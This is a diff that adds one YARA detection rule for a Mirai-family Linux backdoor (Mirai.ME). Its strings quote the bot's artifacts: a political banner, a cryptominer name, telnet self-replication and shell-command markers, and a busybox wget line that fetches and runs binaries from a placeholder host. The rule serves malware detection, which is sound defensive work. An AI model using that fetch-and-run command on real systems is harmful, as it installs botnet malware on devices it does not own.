@@ -9584,3 +9584,28 @@ rule Backdoor_Linux_Mirai_PA_2147964091_0
         )
 }
 
+rule Backdoor_Linux_Mirai_ME_2147971273_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Backdoor:Linux/Mirai.ME!MSR"
+        threat_id = "2147971273"
+        type = "Backdoor"
+        platform = "Linux: Linux platform"
+        family = "Mirai"
+        severity = "Critical"
+        info = "MSR: Microsoft Security Response"
+        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
+        threshold = "5"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "iranbot init: death to israel" ascii //weight: 1
+        $x_1_2 = "iranbot.xmrig" ascii //weight: 1
+        $x_1_3 = "orf; cd /tmp; /bin/busybox wget http://%s/iran.mipsel; chmod 777 iran.mipsel; ./iran.mipsel selfrep; /bin/busybox http://%s/iran.mips; chmod 777 iran.mips; ./iran.mips selfrep" ascii //weight: 1
+        $x_1_4 = "!selfrep telnet" ascii //weight: 1
+        $x_1_5 = "!shellcmd" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
